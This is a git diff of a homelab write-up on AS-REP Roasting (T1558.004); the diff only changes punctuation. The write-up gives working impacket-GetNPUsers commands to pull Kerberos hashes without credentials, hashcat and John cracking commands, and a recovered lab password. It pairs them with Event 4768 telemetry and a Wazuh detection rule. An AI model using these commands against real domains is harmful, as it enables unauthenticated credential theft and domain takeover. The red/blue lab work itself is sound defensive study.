@@ -1,26 +1,26 @@
-# Project 02 — AS-REP Roasting (T1558.004)
+# Project 02: AS-REP Roasting (T1558.004)
 
-Attack `b.otieno` (misconfig #2 — Kerberos pre-authentication disabled), crack the
+Attack `b.otieno` (misconfig #2: Kerberos pre-authentication disabled), crack the
 password offline, then detect the attack in Wazuh.
 
 ---
 
 ## 1. Scenario
 Kerberos normally makes a user prove they know their password *before* the DC will
-hand out an authentication ticket — this is **pre-authentication**. `b.otieno` has
+hand out an authentication ticket. This is **pre-authentication**. `b.otieno` has
 pre-auth **disabled** (`DoesNotRequirePreAuth = True`), so the DC will return that
 user's AS-REP to **anyone who asks for it**. The AS-REP contains data encrypted with
 the user's password-derived key, so an attacker takes it offline and brute-forces the
-password. The killer detail: this needs **no valid credentials at all** — only the
+password. The killer detail: this needs **no valid credentials at all**, only the
 username. That makes AS-REP roasting a favourite *pre-access* technique, run before an
 attacker has any foothold in the domain.
 
-**Phase:** Red — power on **KALI01 + DC01** only (Wazuh off). See the
+**Phase:** Red, power on **KALI01 + DC01** only (Wazuh off). See the
 [operating guide](https://github.com/manlikefelo/security-homelab/blob/main/docs/low-ram-operating-guide.md).
 
 ## 2. Attack (from KALI01)
 
-No credentials are required — the attacker only needs to reach the DC and know (or
+No credentials are required: the attacker only needs to reach the DC and know (or
 guess) the username.
 
 ```bash
@@ -30,7 +30,7 @@ impacket-GetNPUsers lab.local/b.otieno -dc-ip 10.10.10.10 -no-pass \
 ```
 
 If you don't already know which accounts are roastable, feed a username wordlist and
-let the DC tell you — only the pre-auth-disabled accounts return a hash:
+let the DC tell you, only the pre-auth-disabled accounts return a hash:
 
 ```bash
 impacket-GetNPUsers lab.local/ -dc-ip 10.10.10.10 -no-pass \
@@ -45,27 +45,27 @@ Crack it offline. The canonical tool is **hashcat mode 18200 (AS-REP)**:
 hashcat -m 18200 asrep.hashes /usr/share/wordlists/rockyou.txt
 ```
 On this GPU-less host I crack with **John the Ripper** instead (same hash, CPU, no
-OpenCL dependency — see the run log for why):
+OpenCL dependency, see the run log for why):
 ```bash
 john --format=krb5asrep --wordlist=/usr/share/wordlists/rockyou.txt asrep.hashes
 ```
 
 > **What I proved:** I recovered a domain user's password with **zero** starting
-> credentials — pure pre-auth misconfiguration abuse, the kind of thing an attacker
+> credentials, pure pre-auth misconfiguration abuse, the kind of thing an attacker
 > does before they have any foothold.
 
 ## 3. Telemetry this generates
 On DC01, the AS-REQ writes **Event ID 4768** (a Kerberos authentication ticket / TGT
 was requested) with:
-- **Pre-Authentication Type `0`** — the tell. A normal interactive logon shows
+- **Pre-Authentication Type `0`**: the tell. A normal interactive logon shows
   pre-auth type `2` (encrypted timestamp). Type `0` means the DC issued the TGT
-  *without* the client proving knowledge of the password — exactly what a
+  *without* the client proving knowledge of the password, exactly what a
   pre-auth-disabled account allows.
-- **Ticket Encryption Type `0x17`** (RC4) — the crackable type.
+- **Ticket Encryption Type `0x17`** (RC4): the crackable type.
 
 A 4768 with pre-auth type `0` is the AS-REP-roast signature.
 
-## 4. Detection (in Wazuh — blue phase)
+## 4. Detection (in Wazuh: blue phase)
 Bring up WAZUH01 (see operating guide). The DC's Wazuh agent forwards Security events.
 Search / alert on:
 ```
@@ -93,7 +93,7 @@ Reset the lab afterward by restoring DC01's clean snapshot.
 
 ## 6. Evidence
 
-**Red phase** — screenshots captured live from the KALI01 GUI terminal:
+**Red phase**: screenshots captured live from the KALI01 GUI terminal:
 
 | # | Shot | What it shows |
 |---|------|---------------|
@@ -102,33 +102,33 @@ Reset the lab afterward by restoring DC01's clean snapshot.
 | 3 | [`evidence/03-john-cracks-password.png`](evidence/03-john-cracks-password.png) | John cracking the AS-REP → **`b.otieno : Password1`** |
 | 4 | [`evidence/04-full-chain.png`](evidence/04-full-chain.png) | The whole chain in one full-screen terminal: reach → roast → crack → `--show` |
 
-**Blue phase** — screenshot from the Wazuh dashboard at `https://10.10.10.50`:
+**Blue phase**: screenshot from the Wazuh dashboard at `https://10.10.10.50`:
 
 | # | Shot | What it shows |
 |---|------|---------------|
-| 5 | [`evidence/05-wazuh-asrep-alert.png`](evidence/05-wazuh-asrep-alert.png) | Discover filtered to `rule.id:100011` — **2 hits** from DC01 showing 4768 / preAuthType 0 / RC4 (0x17) / `b.otieno` / krbtgt, source `10.10.10.40`, with the `data.win.*` fields legible inline |
+| 5 | [`evidence/05-wazuh-asrep-alert.png`](evidence/05-wazuh-asrep-alert.png) | Discover filtered to `rule.id:100011`: **2 hits** from DC01 showing 4768 / preAuthType 0 / RC4 (0x17) / `b.otieno` / krbtgt, source `10.10.10.40`, with the `data.win.*` fields legible inline |
 
 Raw command output & alert data:
-- [`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt) — AS-REP hash pulled with no password
-- [`evidence/john_output.txt`](evidence/john_output.txt) — offline crack recovering `Password1`
-- [`evidence/wazuh_alert_100011.json`](evidence/wazuh_alert_100011.json) — the full Wazuh alert document (every `data.win.*` field for the 4768 / preAuthType 0 event)
+- [`evidence/getnpusers_output.txt`](evidence/getnpusers_output.txt): AS-REP hash pulled with no password
+- [`evidence/john_output.txt`](evidence/john_output.txt): offline crack recovering `Password1`
+- [`evidence/wazuh_alert_100011.json`](evidence/wazuh_alert_100011.json): the full Wazuh alert document (every `data.win.*` field for the 4768 / preAuthType 0 event)
 
 See [`RUN-LOG.md`](RUN-LOG.md) for the exact execution record.
 
 ## 7. ATT&CK coverage matrix
 
 How this project's attack maps onto MITRE ATT&CK, and which step my detection covers.
-✅ = I have a Wazuh detection that fires on this step; ⬜ = performed in the attack but
+Yes = I have a Wazuh detection that fires on this step; No = performed in the attack but
 not the point where I detect.
 
 | Tactic | Technique (ID) | Attacker action in this lab | Telemetry | Detection | Wazuh rule |
 |--------|----------------|------------------------------|-----------|-----------|------------|
-| Credential Access | **AS-REP Roasting (T1558.004)** | `GetNPUsers -no-pass` pulls `b.otieno`'s AS-REP with **no credentials** (pre-auth disabled) | DC01 Event **4768**, `preAuthType 0` (+ `ticketEncryptionType 0x17` RC4) | ✅ | **100011** (level 10) |
-| Credential Access | Brute Force: Password Cracking (T1110.002) | Offline crack of the AS-REP hash (John/hashcat) → `b.otieno : Password1` | none — offline, off-host | ⬜ (offline, no telemetry by design) | — |
+| Credential Access | **AS-REP Roasting (T1558.004)** | `GetNPUsers -no-pass` pulls `b.otieno`'s AS-REP with **no credentials** (pre-auth disabled) | DC01 Event **4768**, `preAuthType 0` (+ `ticketEncryptionType 0x17` RC4) | Yes | **100011** (level 10) |
+| Credential Access | Brute Force: Password Cracking (T1110.002) | Offline crack of the AS-REP hash (John/hashcat) → `b.otieno: Password1` | none, offline, off-host | No (offline, no telemetry by design) | - |
 
 > **Impact note for a reviewer:** `b.otieno` is a **Domain Admin** with replication
 > rights, so this single technique takes an *unauthenticated* attacker straight to
-> Domain-Admin credentials — the pivot the DCSync project (T1003.006) then abuses.
+> Domain-Admin credentials: the pivot the DCSync project (T1003.006) then abuses.
 
 **One-line summary:** detects AS-REP Roasting at the AS-REQ step (4768 / preAuthType 0)
 via rule **100011** → MITRE **T1558.004** (Credential Access).
